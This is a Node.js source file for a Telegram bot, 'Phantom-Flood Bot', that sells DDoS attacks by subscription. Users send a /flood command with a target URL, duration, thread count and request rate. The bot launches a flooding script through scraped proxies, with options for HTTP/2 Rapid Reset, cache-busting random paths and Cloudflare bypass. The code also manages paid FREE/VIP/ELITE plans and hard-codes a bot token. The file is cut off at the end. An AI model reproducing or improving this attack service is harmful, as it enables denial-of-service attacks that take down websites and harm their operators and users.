[file name]: main.js
[file content begin]
const TelegramBot = require("node-telegram-bot-api");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs");
const os = require("os");
const express = require("express");
const cors = require("cors");

// ==================== CẤU HÌNH ====================
const BOT_TOKEN = process.env.BOT_TOKEN || "7983734590:AAGoDuaSDiIQ5zaDuP1XhoCd3upAnS1UNsE";
const ADMIN_ID = 5845508484; // ID của bạn (admin)
const PROXY_FILE = "proxy.txt";

// Cấu hình user plan
const USER_PLANS = {
  FREE: {
    name: "FREE",
    timeLimit: 60,
    threadLimit: 10,
    rateLimit: 90,
    canUseOptions: false,
    maxAttackDuration: 60,
  },
  VIP: {
    name: "VIP",
    timeLimit: 120,
    threadLimit: 20,
    rateLimit: 150,
    canUseOptions: true,
    maxAttackDuration: 120,
  },
  ELITE: {
    name: "ELITE",
    timeLimit: 360,
    threadLimit: 50,
    rateLimit: 250,
    canUseOptions: true,
    maxAttackDuration: 360,
  },
  ADMIN: {
    name: "ADMIN",
    timeLimit: 900000, // Không giới hạn
    threadLimit: 100,
    rateLimit: 1000,
    canUseOptions: true,
    maxAttackDuration: 900000,
  }
};

// Lưu trữ user data (trong production nên dùng database)
const userDatabase = new Map();
// =====================================================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const activeAttacks = new Map();

// Khởi tạo Express server cho Railway healthcheck
const app = express();
app.use(cors());
app.use(express.json());

// Health check endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'online', 
    bot: 'Phantom-Flood Bot',
    users: userDatabase.size,
    activeAttacks: activeAttacks.size,
    uptime: process.uptime()
  });
});

// API để kiểm tra user
app.get('/user/:userId', (req, res) => {
  const userId = parseInt(req.params.userId);
  const user = userDatabase.get(userId);
  
  if (user) {
    res.json(user);
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Health check server running on port ${PORT}`);
});

// Kiểm tra user và gán plan
function getUserPlan(userId) {
  // Admin luôn có quyền cao nhất
  if (userId === ADMIN_ID) {
    return USER_PLANS.ADMIN;
  }
  
  // Kiểm tra trong database
  const user = userDatabase.get(userId);
  if (user && user.plan) {
    return USER_PLANS[user.plan.toUpperCase()] || USER_PLANS.FREE;
  }
  
  // Mặc định là FREE
  return USER_PLANS.FREE;
}

// Gửi yêu cầu cấp plan cho admin
async function sendPlanRequestToAdmin(userId, username, requestedPlan) {
  try {
    const userInfo = username ? `@${username}` : `ID: ${userId}`;
    const message = `🆕 *YÊU CẦU CẤP PLAN*\n\n👤 User: ${userInfo}\n🆔 ID: \`${userId}\`\n📋 Requested: ${requestedPlan}\n⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
    
    await bot.sendMessage(ADMIN_ID, message, { parse_mode: "Markdown" });
    
    // Gửi thêm các button để admin approve nhanh
    await bot.sendMessage(ADMIN_ID, "Chọn plan để cấp cho user:", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ FREE", callback_data: `approve_${userId}_FREE` },
            { text: "⭐ VIP", callback_data: `approve_${userId}_VIP` },
            { text: "👑 ELITE", callback_data: `approve_${userId}_ELITE` }
          ],
          [
            { text: "❌ Từ chối", callback_data: `reject_${userId}` }
          ]
        ]
      }
    });
    
    return true;
  } catch (error) {
    console.error("Error sending plan request:", error);
    return false;
  }
}

// Xử lý callback từ admin
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  
  // Chỉ admin mới có thể xử lý callback
  if (userId !== ADMIN_ID) {
    await bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Bạn không có quyền thực hiện hành động này!" });
    return;
  }
  
  if (data.startsWith("approve_")) {
    const parts = data.split("_");
    const targetUserId = parseInt(parts[1]);
    const plan = parts[2];
    
    // Cập nhật plan cho user
    userDatabase.set(targetUserId, {
      id: targetUserId,
      plan: plan,
      approvedBy: ADMIN_ID,
      approvedAt: new Date().toISOString(),
      lastActive: new Date().toISOString()
    });
    
    // Thông báo cho admin
    await bot.editMessageText(`✅ Đã cấp plan ${plan} cho user ID: ${targetUserId}`, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id
    });
    
    // Thông báo cho user
    try {
      await bot.sendMessage(targetUserId, `🎉 *CHÚC MỪNG!*\n\nBạn đã được cấp plan *${plan}*!\n\nBây giờ bạn có thể sử dụng bot với các tính năng:\n⏰ Time: ${USER_PLANS[plan].timeLimit}s\n🧵 Threads: ${USER_PLANS[plan].threadLimit}\n📊 Rate: ${USER_PLANS[plan].rateLimit} req/s\n⚙️ Options: ${USER_PLANS[plan].canUseOptions ? 'Có' : 'Không'}\n\nSử dụng /flood để bắt đầu!`, { parse_mode: "Markdown" });
    } catch (error) {
      console.error("Cannot notify user:", error);
    }
    
    await bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Đã cấp plan thành công!" });
    
  } else if (data.startsWith("reject_")) {
    const targetUserId = parseInt(data.split("_")[1]);
    
    await bot.editMessageText(`❌ Đã từ chối yêu cầu của user ID: ${targetUserId}`, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id
    });
    
    await bot.answerCallbackQuery(callbackQuery.id, { text: "Đã từ chối yêu cầu" });
  }
});

// Format thời gian
function formatDuration(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}h ${m}m ${s}s`;
}

// Lệnh /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username;

  // Lấy plan của user
  const userPlan = getUserPlan(userId);
  
  // Nếu là user mới (chưa có trong database)
  if (!userDatabase.has(userId) && userId !== ADMIN_ID) {
    // Mặc định gán plan FREE nhưng vẫn thông báo cần approval
    userDatabase.set(userId, {
      id: userId,
      username: username,
      plan: "FREE",
      isPending: true,
      joinedAt: new Date().toISOString(),
      lastActive: new Date().toISOString()
    });
    
    // Gửi yêu cầu cấp plan cho admin
    await sendPlanRequestToAdmin(userId, username, "FREE");
  } else {
    // Cập nhật last active
    const userData = userDatabase.get(userId) || {};
    userData.lastActive = new Date().toISOString();
    userDatabase.set(userId, userData);
  }

  const welcomeMessage = `
🔥 *PHANTOM-FLOOD BOT* 🔥
💀 Telegram Control Panel 💀

👤 *THÔNG TIN TÀI KHOẢN*
• Plan: *${userPlan.name}*
• Time Limit: *${userPlan.timeLimit}s*
• Thread Limit: *${userPlan.threadLimit}*
• Rate Limit: *${userPlan.rateLimit}/s*
• Options: *${userPlan.canUseOptions ? '✅ Có' : '❌ Không'}*

*Các lệnh có sẵn:*

/flood - Bắt đầu tấn công
/stop - Dừng tấn công đang chạy
/status - Xem trạng thái các cuộc tấn công
/proxy - Xem danh sách proxy
/getproxy - Lấy proxy mới
/help - Xem hướng dẫn chi tiết
/myplan - Xem thông tin plan của bạn
/requestplan - Yêu cầu nâng cấp plan

📌 *Ví dụ nhanh:*
\`/flood https://target.com 60 10 90\`

━━━━━━━━━━━━━━━━━━━━
💎 *NÂNG CẤP PLAN ĐỂ MỞ KHÓA TÍNH NĂNG*

⭐ *VIP PLAN*
• Time: 120s | Threads: 20 | Rate: 150/s
• Sử dụng được tất cả options
• Giá: Liên hệ admin

👑 *ELITE PLAN*
• Time: 360s | Threads: 50 | Rate: 250/s
• Full options không giới hạn
• Giá: Liên hệ admin

📞 *Liên hệ admin:* @mduc19
━━━━━━━━━━━━━━━━━━━━

*Lưu ý:* User FREE chỉ được dùng với thời gian 60s, threads 10, rate 90/s và không dùng được options.
`;

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: "Markdown" });
});

// Lệnh /myplan
bot.onText(/\/myplan/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const userPlan = getUserPlan(userId);
  const userData = userDatabase.get(userId) || {};
  
  let planMessage = `
📋 *THÔNG TIN PLAN CỦA BẠN*

• Plan: *${userPlan.name}*
• Time Limit: *${userPlan.timeLimit} giây*
• Thread Limit: *${userPlan.threadLimit}*
• Rate Limit: *${userPlan.rateLimit} req/s*
• Options: *${userPlan.canUseOptions ? '✅ Được phép' : '❌ Không được phép'}*

📊 *Thống kê:*
• Tham gia: ${userData.joinedAt ? new Date(userData.joinedAt).toLocaleDateString('vi-VN') : 'Chưa có dữ liệu'}
• Lần hoạt động cuối: ${userData.lastActive ? new Date(userData.lastActive).toLocaleDateString('vi-VN') : 'Chưa có dữ liệu'}
`;
  
  if (userPlan.name === "FREE") {
    planMessage += `

━━━━━━━━━━━━━━━━━━━━
💎 *MUỐN NÂNG CẤP?*
Sử dụng lệnh /requestplan để yêu cầu nâng cấp lên VIP hoặc ELITE!

📞 Liên hệ admin: @mduc19
`;
  }
  
  bot.sendMessage(chatId, planMessage, { parse_mode: "Markdown" });
});

// Lệnh /requestplan
bot.onText(/\/requestplan/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username;
  
  const currentPlan = getUserPlan(userId);
  
  const requestKeyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⭐ VIP PLAN", callback_data: `req_${userId}_VIP` },
          { text: "👑 ELITE PLAN", callback_data: `req_${userId}_ELITE` }
        ]
      ]
    }
  };
  
  const message = `📋 *YÊU CẦU NÂNG CẤP PLAN*

Plan hiện tại: *${currentPlan.name}*

Chọn plan bạn muốn nâng cấp:
• ⭐ VIP: Time 120s, Threads 20, Rate 150/s, Full options
• 👑 ELITE: Time 360s, Threads 50, Rate 250/s, Full options

📞 *Liên hệ admin:* @mduc19 để biết giá và thanh toán.`;
  
  bot.sendMessage(chatId, message, { parse_mode: "Markdown", ...requestKeyboard });
});

// Xử lý yêu cầu nâng cấp từ user
bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  
  if (data.startsWith("req_")) {
    const parts = data.split("_");
    const targetUserId = parseInt(parts[1]);
    const requestedPlan = parts[2];
    
    // Chỉ cho user request cho chính mình
    if (userId !== targetUserId) {
      await bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Bạn chỉ có thể request plan cho chính mình!" });
      return;
    }
    
    // Gửi yêu cầu cho admin
    const success = await sendPlanRequestToAdmin(userId, callbackQuery.from.username, requestedPlan);
    
    if (success) {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: `✅ Đã gửi yêu cầu nâng cấp lên ${requestedPlan} cho admin!` 
      });
      
      // Edit message
      await bot.editMessageText(`📨 *Yêu cầu đã được gửi!*\n\nĐã gửi yêu cầu nâng cấp lên *${requestedPlan}* cho admin.\nAdmin sẽ xem xét và phê duyệt trong thời gian sớm nhất.\n\n📞 Liên hệ: @mduc19`, {
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        parse_mode: "Markdown"
      });
    } else {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: "❌ Có lỗi khi gửi yêu cầu!" 
      });
    }
  }
});

// Lệnh /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const userPlan = getUserPlan(userId);

  const helpMessage = `
📖 *HƯỚNG DẪN SỬ DỤNG*

*Cú pháp:*
\`/flood <target> <time> <threads> <ratelimit> [options]\`

*Giới hạn theo plan của bạn (${userPlan.name}):*
• ⏰ Time: Tối đa ${userPlan.timeLimit} giây
• 🧵 Threads: Tối đa ${userPlan.threadLimit}
• 📊 Rate: Tối đa ${userPlan.rateLimit} req/s
• ⚙️ Options: ${userPlan.canUseOptions ? 'Được phép sử dụng' : 'Không được phép sử dụng'}

*Tham số bắt buộc:*
• \`target\` - URL mục tiêu (https://...)
• \`time\` - Thời gian tấn công (giây)
• \`threads\` - Số luồng
• \`ratelimit\` - Giới hạn request/giây

*Tham số tùy chọn:*
• \`--proxy <file>\` - File proxy (mặc định: proxy.txt)
• \`--debug\` - Chế độ debug chi tiết
• \`--reset\` - Bật chế độ Rapid Reset (mạnh hơn)
• \`--randpath\` - Random paths để bypass cache
• \`--close\` - Đóng socket khi gặp 429
• \`--browser <N>\` - Max concurrent browsers (Cloudflare bypass)

*Ví dụ:*
\`\`\`
/flood https://target.com 60 10 90
/flood https://target.com 120 10 90 --reset --debug
/flood https://target.com 120 10 90 --browser 5 --randpath
\`\`\`

━━━━━━━━━━━━━━━━━━━━
💎 *NÂNG CẤP PLAN*
Sử dụng /requestplan để yêu cầu nâng cấp
Liên hệ admin: @mduc19
━━━━━━━━━━━━━━━━━━━━
`;

  bot.sendMessage(chatId, helpMessage, { parse_mode: "Markdown" });
});

// Lệnh /flood với kiểm tra plan
bot.onText(/\/flood(.*)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  // Lấy plan của user
  const userPlan = getUserPlan(userId);
  
  const argsString = match[1].trim();

  if (!argsString) {
    return bot.sendMessage(
      chatId,
      `
❌ *Thiếu tham số!*

*Cú pháp:* \`/flood <target> <time> <threads> <ratelimit> [options]\`

*Ví dụ:* \`/flood https://target.com ${Math.min(60, userPlan.timeLimit)} ${Math.min(10, userPlan.threadLimit)} ${Math.min(90, userPlan.rateLimit)}\`

*Plan của bạn (${userPlan.name}):*
• Time max: ${userPlan.timeLimit}s
• Threads max: ${userPlan.threadLimit}
• Rate max: ${userPlan.rateLimit}/s
• Options: ${userPlan.canUseOptions ? '✅' : '❌'}

Gõ /help để xem hướng dẫn chi tiết.
`,
      { parse_mode: "Markdown" },
    );
  }

  // Parse arguments
  const args = parseArgs(argsString);

  if (args.length < 4) {
    return bot.sendMessage(
      chatId,
      `
❌ *Thiếu tham số!*

Cần ít nhất 4 tham số: target, time, threads, ratelimit

*Ví dụ:* \`/flood https://target.com ${Math.min(60, userPlan.timeLimit)} ${Math.min(10, userPlan.threadLimit)} ${Math.min(90, userPlan.rateLimit)}\`
`,
      { parse_mode: "Markdown" },
    );
  }

  const target = args[0];
  const time = parseInt(args[1]);
  const threads = parseInt(args[2]);
  const ratelimit = parseInt(args[3]);
  const options = args.slice(4);

  // Kiểm tra giới hạn plan
  if (time > userPlan.timeLimit) {
    return bot.sendMessage(chatId, `❌ Plan ${userPlan.name} chỉ cho phép time tối đa ${userPlan.timeLimit} giây!\n\nSử dụng /requestplan để nâng cấp lên VIP/ELITE.`, {
      parse_mode: "Markdown"
    });
  }
  
  if (threads > userPlan.threadLimit) {
    return bot.sendMessage(chatId, `❌ Plan ${userPlan.name} chỉ cho phép threads tối đa ${userPlan.threadLimit}!\n\nSử dụng /requestplan để nâng cấp lên VIP/ELITE.`, {
      parse_mode: "Markdown"
    });
  }
  
  if (ratelimit > userPlan.rateLimit) {
    return bot.sendMessage(chatId, `❌ Plan ${userPlan.name} chỉ cho phép rate limit tối đa ${userPlan.rateLimit}/s!\n\nSử dụng /requestplan để nâng cấp lên VIP/ELITE.`, {
      parse_mode: "Markdown"
    });
  }
  
  // Kiểm tra options (nếu plan FREE không cho dùng options)
  if (!userPlan.canUseOptions && options.length > 0) {
    const hasOptions = options.some(opt => 
      opt.startsWith('--proxy') || 
      opt.startsWith('--debug') || 
      opt.startsWith('--reset') || 
      opt.startsWith('--randpath') || 
      opt.startsWith('--close') || 
      opt.startsWith('--browser')
    );
    
    if (hasOptions) {
      return bot.sendMessage(chatId, `❌ Plan ${userPlan.name} không được phép sử dụng options!\n\nCác options như --debug, --reset, --randpath, --browser chỉ dành cho VIP và ELITE.\nSử dụng /requestplan để nâng cấp.`, {
        parse_mode: "Markdown"
      });
    }
  }

  // Validate cơ bản
  if (!target.startsWith("https://")) {
    return bot.sendMessage(chatId, "❌ Target phải bắt đầu bằng `https://`", {
      parse_mode: "Markdown",
    });
  }

  if (isNaN(time) || time < 1 || time > 900000) {
    return bot.sendMessage(chatId, `❌ Thời gian phải từ 1-${userPlan.timeLimit} giây (giới hạn plan ${userPlan.name})`);
  }

  if (isNaN(threads) || threads < 1 || threads > 100) {
    return bot.sendMessage(chatId, `❌ Threads phải từ 1-${userPlan.threadLimit} (giới hạn plan ${userPlan.name})`);
  }

  if (isNaN(ratelimit) || ratelimit < 1) {
    return bot.sendMessage(chatId, `❌ Ratelimit phải >= 1 và <= ${userPlan.rateLimit} (giới hạn plan ${userPlan.name})`);
  }

  // Tìm proxy file trong options hoặc dùng mặc định
  let proxyFile = PROXY_FILE;
  const proxyIndex = options.indexOf("--proxy");
  if (proxyIndex !== -1 && options[proxyIndex + 1]) {
    proxyFile = options[proxyIndex + 1];
    options.splice(proxyIndex, 2); // Xóa --proxy và value
  }

  // Kiểm tra proxy file tồn tại
  const proxyPath = path.join(__dirname, proxyFile);
  if (!fs.existsSync(proxyPath)) {
    return bot.sendMessage(
      chatId,
      `❌ Không tìm thấy file proxy: \`${proxyFile}\``,
      { parse_mode: "Markdown" },
    );
  }

  // Build command
  const phantomPath = path.join(__dirname, "script.js");
  const cmdArgs = [
    phantomPath,
    target,
    time.toString(),
    threads.toString(),
    ratelimit.toString(),
    proxyFile,
    ...options,
  ];

  // Gửi thông báo bắt đầu
  const startMessage = `
🚀 *BẮT ĐẦU TẤN CÔNG*

👤 *User Plan:* ${userPlan.name}
🎯 *Target:* \`${target}\`
⏱ *Thời gian:* ${formatDuration(time)} (Max: ${formatDuration(userPlan.timeLimit)})
🔀 *Threads:* ${threads} (Max: ${userPlan.threadLimit})
📊 *Rate:* ${ratelimit} req/s (Max: ${userPlan.rateLimit})
📁 *Proxy:* ${proxyFile}
${options.length > 0 ? `⚙️ *Options:* ${options.join(" ")}` : ""}

💀 Đang khởi động script.js...
`;

  bot.sendMessage(chatId, startMessage, { parse_mode: "Markdown" });

  // Spawn process với detached để có thể kill cả process group
  const child = spawn("node", cmdArgs, {
    cwd: __dirname,
    stdio: ["ignore", "pipe", "pipe"],
    detached: true,
    env: { ...process.env, FORCE_COLOR: "0" },
  });

  const attackId = `${chatId}_${Date.now()}`;

  activeAttacks.set(attackId, {
    process: child,
    target,
    startTime: Date.now(),
    duration: time,
    chatId,
    userId,
    userPlan: userPlan.name,
  });

  let outputBuffer = "";
  let lastSentTime = 0;
  let statusMessageId = null;

  // Capture stdout
  child.stdout.on("data", (data) => {
    outputBuffer += data.toString();
  });

  // Interval để cập nhật output mỗi 5 giây
  const outputInterval = setInterval(async () => {
    const now = Date.now();
    if (outputBuffer.trim() && now - lastSentTime >= 5000) {
      const lines = outputBuffer.split("\n").filter((l) => l.trim());
      if (lines.length > 0) {
        const lastLines = lines.slice(-20).join("\n");
        const formattedMsg = `📤 *Output (Cập nhật 5s):*\n\`\`\`\n${lastLines.slice(-3500)}\n\`\`\``;

        try {
          if (!statusMessageId) {
            const sentMsg = await bot.sendMessage(chatId, formattedMsg, {
              parse_mode: "Markdown",
            });
            statusMessageId = sentMsg.message_id;
          } else {
            await bot.editMessageText(formattedMsg, {
              chat_id: chatId,
              message_id: statusMessageId,
              parse_mode: "Markdown",
            });
          }
        } catch (e) {
          try {
            const sentMsg = await bot.sendMessage(chatId, formattedMsg, {
              parse_mode: "Markdown",
            });
            statusMessageId = sentMsg.message_id;
          } catch (err) {}
        }
        lastSentTime = now;
        outputBuffer = "";
      }
    }
  }, 5000);

  // Capture stderr
  child.stderr.on("data", (data) => {
    outputBuffer += data.toString();
  });

  // Process exit - cleanup tài nguyên
  child.on("close", (code) => {
    clearInterval(outputInterval);
    activeAttacks.delete(attackId);
    outputBuffer = "";

    if (global.gc) {
      try {
        global.gc();
      } catch (e) {}
    }

    const endMessage =
      code === 0 || code === null
        ? `✅ *TẤN CÔNG HOÀN TẤT*\n\n🎯 Target: \`${target}\`\n👤 Plan: ${userPlan.name}\n⏱ Time: ${formatDuration(time)}`
        : `❌ *TẤN CÔNG KẾT THÚC*\n\nExit code: ${code}`;

    bot
      .sendMessage(chatId, endMessage, { parse_mode: "Markdown" })
      .catch(() => {});
  });

  child.on("error", (err) => {
    activeAttacks.delete(attackId);
    bot
      .sendMessage(chatId, `❌ *Lỗi khởi động:*\n\`${err.message}\``, {
        parse_mode: "Markdown",
      })
      .catch(() => {});
  });

  // Auto stop sau thời gian duration + buffer
  setTimeout(
    () => {
      if (activeAttacks.has(attackId)) {
        const attack = activeAttacks.get(attackId);
        if (attack && attack.process && attack.process.pid) {
          try {
            process.kill(-attack.process.pid, "SIGINT");
          } catch (e) {
            try {
              attack.process.kill("SIGINT");
            } catch (e) {}
          }
        }
        activeAttacks.delete(attackId);
      }
    },
    (time + 10) * 1000,
  );
});

// Lệnh /stop (giữ nguyên)
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  let stoppedCount = 0;

  for (const [attackId, attack] of activeAttacks) {
    if (attack.chatId === chatId || attack.userId === userId) {
      try {
        const pid = attack.process.pid;
        if (pid) {
          try {
            process.kill(-pid, "SIGINT");
          } catch (e) {
            attack.process.kill("SIGINT");
          }
        }
        activeAttacks.delete(attackId);
        stoppedCount++;
      } catch (e) {
        activeAttacks.delete(attackId);
      }
    }
  }

  if (stoppedCount > 0) {
    bot.sendMessage(chatId, `🛑 Đã dừng ${stoppedCount} cuộc tấn công.`);
  } else {
    bot.sendMessage(chatId, "ℹ️ Không có cuộc tấn công nào đang chạy.");
  }
});

// Lệnh /status (giữ nguyên)
bot.onText(/\/status/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const userAttacks = [];

  for (const [attackId, attack] of activeAttacks) {
    if (attack.chatId === chatId || attack.userId === userId) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(0, attack.duration - elapsed);

      userAttacks.push({
        target: attack.target,
        elapsed: formatDuration(elapsed),
        remaining: formatDuration(remaining),
        plan: attack.userPlan,
      });
    }
  }

  const userPlan = getUserPlan(userId);

  if (userAttacks.length === 0) {
    return bot.sendMessage(
      chatId,
      `
ℹ️ *Không có cuộc tấn công nào đang chạy.*

👤 *Thông tin của bạn:*
• Plan: ${userPlan.name}
• Time Limit: ${userPlan.timeLimit}s
• Thread Limit: ${userPlan.threadLimit}
• Rate Limit: ${userPlan.rateLimit}/s
• Options: ${userPlan.canUseOptions ? '✅' : '❌'}

🖥 *System Info:*
CPU Load: ${os
        .loadavg()
        .map((l) => l.toFixed(2))
        .join(", ")}
RAM Usage: ${((1 - os.freemem() / os.totalmem()) * 100).toFixed(1)}% (${(
        (os.totalmem() - os.freemem()) /
        1024 /
        1024 /
        1024
      ).toFixed(2)}GB / ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)}GB)
`,
      { parse_mode: "Markdown" },
    );
  }

  let statusMessage = "📊 *TRẠNG THÁI TẤN CÔNG*\n\n";

  // Add User Info
  statusMessage += `👤 *User Plan:* ${userPlan.name}\n`;
  statusMessage += `⏰ Time Limit: ${userPlan.timeLimit}s | 🧵 Threads: ${userPlan.threadLimit} | 📊 Rate: ${userPlan.rateLimit}/s\n\n`;
  
  // Add System Info
  statusMessage += `🖥 *System Info:*\n`;
  statusMessage += `CPU Load: \`${os
    .loadavg()
    .map((l) => l.toFixed(2))
    .join(", ")}\`\n`;
  statusMessage += `RAM: \`${((1 - os.freemem() / os.totalmem()) * 100).toFixed(
    1,
  )}%\` (${((os.totalmem() - os.freemem()) / 1024 / 1024 / 1024).toFixed(2)}GB / ${(
    os.totalmem() /
    1024 /
    1024 /
    1024
  ).toFixed(2)}GB)\n\n`;
  statusMessage += `--------------------------------\n\n`;

  userAttacks.forEach((attack, index) => {
    statusMessage += `*${index + 1}.* \`${attack.target}\`\n`;
    statusMessage += `   📋 Plan: ${attack.plan}\n`;
    statusMessage += `   ⏱ Đã chạy: ${attack.elapsed}\n`;
    statusMessage += `   ⏳ Còn lại: ${attack.remaining}\n\n`;
  });

  bot.sendMessage(chatId, statusMessage, { parse_mode: "Markdown" });
});

// Lệnh /proxy (giữ nguyên)
bot.onText(/\/proxy/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const userPlan = getUserPlan(userId);
  
  const proxyPath = path.join(__dirname, PROXY_FILE);
  if (!fs.existsSync(proxyPath))
    return bot.sendMessage(chatId, "❌ File proxy chưa tồn tại.");

  fs.readFile(proxyPath, "utf8", (err, data) => {
    if (err) return bot.sendMessage(chatId, "❌ Lỗi đọc file proxy.");
    const lines = data.split("\n").filter((l) => l.trim());
    const count = lines.length;
    const preview = lines.slice(0, 15).join("\n");
    bot.sendMessage(
      chatId,
      `📁 *Proxy List*\n📊 Tổng: ${count} proxy\n👤 Plan: ${userPlan.name}\n\nXem trước (15 dòng):\n\`\`\`\n${preview}\n\`\`\``,
      { parse_mode: "Markdown" },
    );
  });
});

// Lệnh /getproxy (giữ nguyên)
bot.onText(/\/getproxy/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const userPlan = getUserPlan(userId);

  bot.sendMessage(chatId, "🔄 Đang chạy tool lấy proxy...");
  const proxyScript = path.join(__dirname, "proxy.js");

  const child = spawn("node", [proxyScript], { cwd: __dirname });

  let stderr = "";
  child.stderr.on("data", (d) => (stderr += d));

  child.on("close", (code) => {
    if (code === 0) {
      const proxyPath = path.join(__dirname, PROXY_FILE);
      if (fs.existsSync(proxyPath)) {
        const count = fs
          .readFileSync(proxyPath, "utf8")
          .split("\n")
          .filter((l) => l.trim()).length;
        bot.sendMessage(
          chatId,
          `✅ Đã lấy proxy xong! Tổng hiện tại: ${count}\n👤 Plan: ${userPlan.name}`,
        );
      } else {
        bot.sendMessage(chatId, "✅ Đã chạy xong nhưng không thấy file proxy.");
      }
    } else {
      bot.sendMessage(
        chatId,
        `❌ Lỗi khi lấy proxy. Exit code: ${code}\nStderr: ${stderr.slice(0, 200)}`,
      );
    }
  });

  child.on("error", (err) => {
    bot.sendMessage(chatId, `❌ Lỗi thực thi: ${err.message}`);
  });
});

// Parse arguments với hỗ trợ quotes (giữ nguyên)
function parseArgs(str) {
  const args = [];
  let current = "";
  let inQuotes = false;
  let quoteChar = "";

  for (let i = 0; i < str.length; i++) {
    const char = str[i];

    if ((char === '"' || char === "'") && !inQuotes) {
      inQuotes = true;
      quoteChar = char;
    } else if (char === quoteChar && inQuotes) {
      inQuotes = false;
      quoteChar = "";
    } else if (char === " " && !inQuotes) {
      if (current.trim()) {
        args.push(current.trim());
      }
      current = "";
    } else {
      current += char;
    }
  }

  if (current.trim()) {
    args.push(current.trim());
  }

  return args;
}

// Xử lý lỗi polling (giữ nguyên)
bot.on("polling_error", (error) => {
  console.error("Polling error:", error.code);
});

// Tự động chạy proxy scraper mỗi 30 phút (giữ nguyên)
function startProxyScraper() {
  const proxyScript = path.join(__dirname, "proxy.js");
  const runScraper = () => {
    console.log("[SYSTEM] Đang cập nhật proxy list (Background)...");
    const child = spawn("node", [proxyScript, "--silent"], {
      cwd: __dirname,
      detached: true,
      stdio: "ignore",
    });
    child.unref();
  };

  runScraper();
  setInterval(runScraper, 10 * 60 * 1000);
}

// Thêm admin command để quản lý users
bot.onText(/\/admin (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  // Chỉ admin mới được sử dụng
  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Bạn không có quyền sử dụng lệnh này!");
  }
  
  const command = match[1].toLowerCase();
  
  if (command === "users") {
    let userList = "📋 *DANH SÁCH USERS*\n\n";
    let count = 0;
    
    for (const [id, userData] of userDatabase) {
      count++;
      userList += `${count}. ID: \`${id}\` | @${userData.username || 'N/A'} | Plan: ${userData.plan || 'FREE'}\n`;
      if (userData.approvedAt) {
        userList += `   ✅ Approved: ${new Date(userData.approvedAt).toLocaleDateString('vi-VN')}\n`;
      }
      userList += '\n';
    }
    
    userList += `\nTổng: ${count} users`;
    bot.sendMessage(chatId, userList, { parse_mode: "Markdown" });
    
  } else if (command.startsWith("setplan ")) {
    const parts = match[1].split(" ");
    if (parts.length >= 3) {
      const targetId = parseInt(parts[1]);
      const plan = parts[2].toUpperCase();
      
      if (USER_PLANS[plan]) {
        const currentData = userDatabase.get(targetId) || {};
        userDatabase.set(targetId, {
          ...currentData,
          id: targetId,
          plan: plan,
          approvedBy: ADMIN_ID,
          approvedAt: new Date().toISOString()
        });
        
        bot.sendMessage(chatId, `✅ Đã set plan ${plan} cho user ID: ${targetId}`);
        
        // Thông báo cho user
        try {
          bot.sendMessage(targetId, `🎉 *THÔNG BÁO*\n\nAdmin đã cấp plan *${plan}* cho bạn!\n\nBây giờ bạn có thể sử dụng bot với các tính năng mới:\n⏰ Time: ${USER_PLANS[plan].timeLimit}s\n🧵 Threads: ${USER_PLANS[plan].threadLimit}\n📊 Rate: ${USER_PLANS[plan].rateLimit} req/s\n⚙️ Options: ${USER_PLANS[plan].canUseOptions ? 'Có' : 'Không'}\n\nSử dụng /flood để bắt đầu!`, { parse_mode: "Markdown" });
        } catch (error) {
          console.error("Cannot notify user:", error);
        }
      } else {
        bot.sendMessage(chatId, "❌ Plan không hợp lệ. Các plan: FREE, VIP, ELITE");
      }
    } else {
      bot.sendMessage(chatId, "❌ Sai cú pháp. Sử dụng: /admin setplan <user_id> <plan>");
    }
  } else if (command === "stats") {
    const stats = {
      totalUsers: userDatabase.size,
      freeUsers: Array.from(userDatabase.values()).filter(u => u.plan === 'FREE').length,
      vipUsers: Array.from(userDatabase.values()).filter(u => u.plan === 'VIP').length,
      eliteUsers: Array.from(userDatabase.values()).filter(u => u.plan === 'ELITE').length,
      activeAttacks: activeAttacks.size
    };
    
    const statsMessage = `
📊 *THỐNG KÊ HỆ THỐNG*

👥 *Users:*
• Tổng: ${stats.totalUsers}
• FREE: ${stats.freeUsers}
• VIP: ${stats.vipUsers}
• ELITE: ${stats.eliteUsers}

⚔️ *Attacks:*
• Đang chạy: ${stats.activeAttacks}
